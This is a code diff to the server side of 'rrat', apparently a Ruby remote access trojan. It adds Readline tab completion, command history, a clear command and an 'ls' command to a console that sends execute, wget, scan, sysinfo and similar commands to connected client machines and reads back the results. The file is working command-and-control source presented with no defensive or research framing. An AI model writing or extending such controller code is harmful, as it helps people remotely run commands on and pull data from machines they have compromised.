@@ -4,8 +4,6 @@ $:.unshift(File.expand_path(File.join(File.dirname(rrbase), 'lib')))
 
 require 'core'
 
-trap('INT') {Server.quit}
-
 debug_status = false
 debug_status = true if ARGV.include? ("DEBUG")
 
@@ -120,15 +118,15 @@ class Server
   end
 
   def quit
-    ans = RubyRat::Helpers.prompt "Exit server and lose all clients? (Y/n): ".red
+    ans = Readline::readline "Exit server and lose all clients? (Y/n): ".red, false
     exit 0 if ans.downcase.include? 'y'
     return
   end
 
   # for use outside of the class
   def self.quit
-    ans = RubyRat::Helpers.prompt "\nExit server and lose all clients? (Y/n): ".red
-    exit 0 if ans.downcase.gsub!("\n", '') == 'y'
+    ans = Readline::readline "Exit server and lose all clients? (Y/n): ".red, false
+    exit 0 if ans.downcase.include? 'y'
     return
   end
 end
@@ -150,7 +148,8 @@ end
 
 def run
 
-  client_commands = [ 'getpid', 'ifconfig', 'scan', 'sysinfo', 'pwd', 'wget', 'execute']
+  client_commands  = [ 'getpid', 'ifconfig', 'scan', 'sysinfo', 'pwd', 'wget', 'execute', 'ls']
+  general_commands = [ 'client', 'clients', 'help', 'history', 'clear', 'quit', 'exit']
 
   port = 4567
   port = ARGV[0].to_i if !ARGV[0].nil? && ARGV[0] != 'DEBUG'
@@ -162,13 +161,23 @@ def run
   puts "Server started on #{port}".green
 
   while true
+    trap('INT') {Server.quit}
+
+    Readline.completion_append_character = " "
+
     exec_cmd = nil
     if !server.current_client.nil?
-      input = RubyRat::Helpers.prompt "rrat".red, " (Client #{server.current_client.uid}) > "
+      list = client_commands + general_commands
+      comp = proc { |s| list.grep( /^#{Regexp.escape(s)}/ ) }
+      Readline.completion_proc = comp
+      input = Readline::readline "#{"rrat".red} (Client #{server.current_client.uid}) > ", true
       exec_cmd = input
     else
-      input = RubyRat::Helpers.prompt "rrat".red, '> '
+      comp = proc { |s| general_commands.grep( /^#{Regexp.escape(s)}/ ) }
+      Readline.completion_proc = comp
+      input = Readline::readline "#{"rrat".red} > "
     end
+    Readline::HISTORY.push(input)
     input, action = input.split(' ')
 
     # Check if the user is using a client command when no client is selected
@@ -188,7 +197,10 @@ def run
       server.goodbye
     when 'help'
       server.help
-
+    when 'history'
+      Readline::HISTORY.each_with_index { |e, i|  puts "#{i}      #{e}" if !e.nil?}
+    when 'clear'
+      `clear`
     # Client commands
     when 'sysinfo'
       server.send_client('sysinfo', server.current_client)
@@ -207,6 +219,9 @@ def run
       data = server.recv_client(server.current_client)
     when 'execute'
       server.send_client("execute #{exec_cmd.gsub('execute ', '')}", server.current_client)
+      data = server.recv_client(server.current_client)
+    when 'ls'
+      server.send_client('ls', server.current_client)
       data = server.recv_client(server.current_client)
     when 'quit'
       server.quit
